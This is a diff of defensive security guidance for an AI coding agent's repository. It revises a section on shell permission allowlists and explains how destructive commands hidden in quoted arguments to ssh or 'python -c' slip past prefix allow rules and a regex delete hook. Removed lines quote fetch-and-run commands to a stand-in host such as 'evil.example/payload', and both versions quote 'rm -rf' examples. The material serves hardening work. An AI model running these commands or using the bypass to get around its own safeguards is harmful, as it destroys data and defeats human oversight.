@@ -153,34 +153,40 @@ def call_external_api(api_key, endpoint):
 
 Log the key name as a string literal if it helps debugging ("NCBI_API_KEY missing or rejected"), never the value. This holds for every credential the agent handles: NCBI API keys, LLM provider keys, the AGE connection string.
 
-### 5. Shell allowlist bypass via chained commands
+### 5. Shell allowlist bypass via quoted single-segment commands
 
-User request: "Let the agent run git, python, and curl commands without prompting"
+User request: "Let the agent run git, python, ssh, and curl commands without prompting"
 
-This repo's actual `.claude/settings.json` uses prefix-match allow rules:
+This repo's actual `.claude/settings.json` uses prefix-match allow rules, among others:
 
 ```json
 "permissions": {
   "allow": [
     "Bash(git:*)",
     "Bash(python:*)",
+    "Bash(python -c:*)",
+    "Bash(ssh:*)",
     "Bash(curl:*)"
   ]
 }
 ```
 
 Wrong assumption:
-- "`Bash(git:*)` only lets the agent run git commands, so it's safe to auto-approve."
+- "`Bash(git:*)` only lets the agent run git commands, so a chained command like `git status && rm -rf /` will silently execute because the string starts with `git`."
 
-Problems:
-- An allow rule matches the whole command string, not each segment. `Bash(git:*)` auto-approves `git status && rm -rf /` because the string starts with `git`. The destructive half rides in on the allowed half.
-- The same is true of `Bash(curl:*)`: `curl https://example.com/x | sh` and `curl -o /tmp/x https://evil.example/payload && bash /tmp/x` both start with `curl` and both pass.
-- Wrapping and chaining defeat a naive allowlist: `git status; curl evil.example/x | sh` and `python -c "import os; os.system('rm -rf ~')"` both pass their leading-token check.
-- This is not hypothetical. It is how a shell allowlist that only lists the good command silently green-lights an arbitrary one.
+Correction:
+- The permission engine evaluates a Bash command per shell segment, splitting on `&&`, `||`, `;`, `|`, `&`, and newlines, and deny beats allow. `git status && rm -rf /` is two segments: `git status`, which matches the `Bash(git:*)` allow rule, and `rm -rf /`, which matches no allow rule and is also caught outright by this repo's `.claude/hooks/block-bash-delete.sh` hook. The command falls to an interactive ask, or a hard block, not silent execution. A visibly chained destructive command is not the residual risk here.
+
+The real residual risk:
+- A destructive command hidden inside a single subcommand's quoted argument. That whole invocation is one segment, with no `&&`, `||`, `;`, `|`, `&`, or newline for the engine to split on, so it rides through on a broad allow rule that only checks the leading token, and it evades a naive rm-detecting hook, because the `rm` sits inside a quoted string, not after a bare separator.
+- `Bash(ssh:*)` allows `ssh some-host "rm -rf /important/data"` outright. The destructive command lives inside the double-quoted remote-command argument passed to the remote shell. To the permission engine this is one segment starting with `ssh`.
+- `Bash(python:*)` and `Bash(python -c:*)` allow `python -c "import os; os.system('rm -rf ~')"`. One segment, starts with `python`, matches. The destructive call is inside the quoted `-c` argument.
+- The same shape applies to any allowed program that can take an arbitrary string to execute: `bash -c "..."`, `sh -c "..."`, `perl -e "..."`, `osascript -e "..."`.
+- `.claude/hooks/block-bash-delete.sh` matches `rm` or `rmdir` only at the start of the command string or immediately after a bare `;`, `&`, or `|` character. It is a plain-text regex over the whole command, not a shell parser, and it does not look inside single or double quotes. In `ssh host "rm -rf ..."` and `python -c "...os.system('rm -rf ~')..."`, the character immediately before `rm` is a quote, not the start of the string or a bare separator, so the hook's pattern does not match and the command passes through.
 
 Correct posture:
-- Pair every narrow allow with explicit denies for the destructive commands and for chain operators, and confirm deny wins over allow. This repo's `PreToolUse` hooks (`.claude/hooks/block-bash-delete.sh`, `.claude/hooks/scan-secrets.sh`) are exactly this kind of pairing: an allow rule for a command family plus a hook that inspects the actual command string before it runs.
-- Deny rules, and any custom hook that inspects commands, must be checked against every segment of a chained command (split on `&&`, `||`, `;`, `|`), and against the whole string. A narrow allow is only safe when paired with denies or hooks that catch chaining and the specific destructive commands, not just the leading token.
-- When you build or extend a gate yourself, split the command on chain operators and validate each segment against the allowlist. Reject the whole command if any segment fails.
+- Pair every narrow allow rule with an explicit deny list for the specific destructive commands and constructs. Deny beats allow in the permission engine, so the deny entries are the load-bearing control, not the prefix allow rule or the hope that chaining gets caught.
+- Extend the rm-detecting hook, or add a new one, to scan the full command string for destructive patterns including inside single and double quotes, not only at the start of the string or after a bare separator. Closing the `ssh ... "rm -rf ..."` and `python -c "...rm -rf..."` gap needs a quoted-argument scan, which `block-bash-delete.sh` does not do today.
+- Treat any Bash allow rule for a program that can execute an arbitrary string argument (`ssh`, `python -c`, `bash -c`, `sh -c`, `perl -e`, `osascript -e`) as higher risk than a program that only takes flags and file paths (`ls`, `cat`, `wc`). Scope those allow rules narrower, or require a quoted-argument-aware hook before broadening them.
 
-The test: does my code pass user input directly to Cypher, SQL, HTTP responses, URLs, or log messages without sanitization, and does my shell allowlist or hook validate every chained segment rather than just the leading command?
+The test: does my code pass user input directly to Cypher, SQL, HTTP responses, URLs, or log messages without sanitization, and does my shell allowlist or hook scan inside quoted subcommand arguments, not just the leading token and top-level chain operators?
